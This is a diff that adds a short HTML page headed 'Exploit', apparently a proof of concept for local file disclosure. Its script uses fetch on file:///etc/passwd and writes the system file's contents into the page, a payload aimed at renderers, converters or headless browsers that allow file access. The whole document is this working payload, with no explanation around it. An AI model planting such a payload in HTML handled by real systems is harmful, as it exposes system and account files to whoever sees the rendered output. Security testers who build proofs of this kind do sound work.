@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Exploit</h1>
+<script>
+fetch("file:///etc/passwd")
+  .then(r => r.text())
+  .then(t => document.write("<pre>" + t + "</pre>"));
+</script>
+</body>
+</html>
